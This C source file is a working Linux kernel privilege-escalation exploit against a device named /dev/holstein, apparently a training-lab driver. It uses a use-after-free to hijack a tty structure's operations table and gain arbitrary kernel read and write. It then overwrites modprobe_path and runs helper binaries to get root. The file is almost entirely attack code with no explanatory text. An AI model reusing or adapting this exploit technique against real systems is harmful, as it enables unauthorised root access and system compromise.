#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/prctl.h>
#ifndef HEXDUMP_COLS
#define HEXDUMP_COLS 16
#endif

#define is_error(c, s)          \
    {                           \
        if ((c)) {              \
            perror((s));        \
            exit(EXIT_FAILURE); \
        }                       \
    }

void hexdump(void *mem, unsigned int len)
{
	unsigned int i, j;

	for(i = 0; i < len + ((len % HEXDUMP_COLS) ? (HEXDUMP_COLS - len % HEXDUMP_COLS) : 0); i++)
	{
		/* print offset */
		if(i % HEXDUMP_COLS == 0)
		{
			printf("0x%06x: ", i);
		}

		/* print hex data */
		if(i < len)
		{
			printf("%02x ", 0xFF & ((char*)mem)[i]);
		}
		else /* end of block, just aligning for ASCII dump */
		{
			printf("   ");
		}

		/* print ASCII dump */
		if(i % HEXDUMP_COLS == (HEXDUMP_COLS - 1))
		{
			for(j = i - (HEXDUMP_COLS - 1); j <= i; j++)
			{
				if(j >= len) /* end of block, not really printing */
				{
					putchar(' ');
				}
				else if(isprint(((char*)mem)[j])) /* printable char */
				{
					putchar(0xFF & ((char*)mem)[j]);        
				}
				else /* other char */
				{
					putchar('.');
				}
			}
			putchar('\n');
		}
	}
}



#define AAR_GADGET 0xffffffff816ae679 - 0xffffffff81000000
#define AAW_GADGET 0xffffffff818d9ef8 - 0xffffffff81000000

int fd1, fd2;
int target_fd;
char buf[0x500];
uint64_t kernel_base;
uint64_t gbuf_addr;

void AAW(uint64_t* dst, unsigned int val){
	uint64_t* fake_ops = buf + 0x300;
	fake_ops[12] = kernel_base + AAW_GADGET;
	*(uint64_t*)(buf + 0x18) = gbuf_addr + 0x300;
	write(fd2, buf, 0x400);
	ioctl(target_fd, val, dst);
}

unsigned int AAR(uint64_t* src){
	uint64_t* fake_ops = buf + 0x300;
	fake_ops[12] = kernel_base + AAR_GADGET;
	*(uint64_t*)(buf + 0x18) = gbuf_addr + 0x300;
	write(fd2, buf, 0x400);
	return ioctl(target_fd, 0, src);
}

void win(){
    system("/dummy");
    system("/shell");
}

#define kernel_offset 0x0000000001072460
#define modprobe  0x0000000001451020
int main() {

	fd1 = open("/dev/holstein", O_RDWR);
	fd2 = open("/dev/holstein", O_RDWR);
	close(fd1);
	target_fd = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
	read(fd2, buf, 0x400);
	hexdump(buf,0x400);
	kernel_base = *(uint64_t*)(buf + 0x18) - kernel_offset;
	printf("[-] kernel base: %p\n", kernel_base);
	gbuf_addr = *(uint64_t*)(buf + 0x38) - (uint64_t)0x38;
	printf("[-] physmap: %p\n", gbuf_addr);
	uint64_t modprobe_path = kernel_base + modprobe;
	printf("[-] modprobe: %p\n", modprobe_path);
	// /tmp/m '2f746d702f6d'
	AAW(modprobe_path, 0x00006d2f);
	win();
    return 0;
}
